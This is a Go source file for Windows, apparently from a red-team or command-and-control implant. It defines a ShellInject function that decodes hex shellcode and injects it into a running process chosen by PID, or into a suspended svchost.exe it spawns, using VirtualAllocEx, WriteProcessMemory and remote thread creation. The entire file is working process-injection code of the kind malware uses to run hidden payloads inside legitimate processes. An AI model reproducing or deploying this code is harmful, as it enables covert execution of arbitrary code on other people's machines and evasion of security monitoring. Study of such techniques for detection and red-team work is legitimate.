// +build windows

package shellinject

import (
	"encoding/hex"
	"strconv"
	"syscall"
	"unsafe"
)

//ShellInject for Windows
//The data variable must be in a hex format
func ShellInject(data string, process string) {
	//logging.Logger.Println("start inject")
	//logging.Logger.Println(data[0:10])

	sc, _ := hex.DecodeString(data)
	//sc := data
	//logging.Logger.Println("Made it to ShellInject")
	//logging.Logger.Println(sc[0:10])
	//logging.Logger.Println(len(sc))

	//If a PID was passed then execute the shellcode into that
	if process != "" {

		proc, _ := strconv.ParseUint(process, 10, 32)
		pid := uint32(proc)

		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		ntdll := syscall.NewLazyDLL("ntdll.dll")
		VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
		VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
		WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
		CloseHandle := kernel32.NewProc("CloseHandle")
		RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
		WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

		pHandle, _ := syscall.OpenProcess(0x0002|0x0008|0x0020|0x0400|0x0010, false, pid)
		addr, _, _ := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
		_, _, _ = WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
		_, _, _ = VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(sc)), 0x10)
		var tHandle uintptr
		_, _, _ = RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
		_, _, _ = WaitForSingleObject.Call(tHandle, syscall.INFINITE)
		_, _, _ = CloseHandle.Call(uintptr(pHandle))

		//This is just basic process injection on a new binary
	} else {

		const MEM_COMMIT = 0x1000
		const MEM_RESERVE = 0x2000
		const PAGE_EXECUTE_READWRITE = 0x40
		const PROCESS_CREATE_THREAD = 0x0002
		const PROCESS_QUERY_INFORMATION = 0x0400
		const PROCESS_VM_OPERATION = 0x0008
		const PROCESS_VM_WRITE = 0x0020
		const PROCESS_VM_READ = 0x0010
		const CREATE_SUSPENDED = 0x00000004

		var K32 = syscall.MustLoadDLL("kernel32.dll")
		var VirtualAlloc = K32.MustFindProc("VirtualAlloc")
		var VirtualAllocEx = K32.MustFindProc("VirtualAllocEx")
		var CreateRemoteThread = K32.MustFindProc("CreateRemoteThread")
		var WriteProcessMemory = K32.MustFindProc("WriteProcessMemory")
		var OpenProcess = K32.MustFindProc("OpenProcess")

		//logging.Logger.Println("Creating a new Process")
		//Process to create
		arg := syscall.StringToUTF16Ptr("c:\\windows\\system32\\svchost.exe")
		var sI syscall.StartupInfo
		var pI syscall.ProcessInformation

		//Create it paused
		// BOOL CreateProcessA(
		// 	LPCSTR                lpApplicationName,
		// 	LPSTR                 lpCommandLine,
		// 	LPSECURITY_ATTRIBUTES lpProcessAttributes,
		// 	LPSECURITY_ATTRIBUTES lpThreadAttributes,
		// 	BOOL                  bInheritHandles,
		// 	DWORD                 dwCreationFlags,
		// 	LPVOID                lpEnvironment,
		// 	LPCSTR                lpCurrentDirectory,
		// 	LPSTARTUPINFOA        lpStartupInfo,
		// 	LPPROCESS_INFORMATION lpProcessInformation
		//   );
		err := syscall.CreateProcess(nil, arg, nil, nil, true, CREATE_SUSPENDED, nil, nil, &sI, &pI)

		if err != nil {
			//logging.Logger.Println("Cannot create the process")
			return
		}

		//logging.Logger.Println("Created.. Injecting")

		Shellcode := sc

		L_Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
		//TODO FIGURE OUT HOW TO GET RID OF THIS
		L_AddrPtr := (*[99000000]byte)(unsafe.Pointer(L_Addr))
		for i := 0; i < len(Shellcode); i++ {
			L_AddrPtr[i] = Shellcode[i]
		}

		var F int = 0
		Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(pI.ProcessId))
		if Proc == 0 {
			//logging.Logger.Println("[!] ERROR : Can't Open Remote Process.")
			return
		}
		R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
		if R_Addr == 0 {
			//logging.Logger.Println("[!] ERROR : Can't Allocate Memory On Remote Process.")
			return
		}
		WPMS, _, _ := WriteProcessMemory.Call(Proc, R_Addr, L_Addr, uintptr(len(Shellcode)), uintptr(F))
		if WPMS == 0 {
			//logging.Logger.Println("[!] ERROR : Can't Write To Remote Process.")
			return
		}

		//logging.Logger.Println(R_Addr)

		CRTS, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
		if CRTS == 0 {
			//logging.Logger.Println("[!] ERROR : Can't Create Remote Thread.")
			return
		}

		return
	}
}
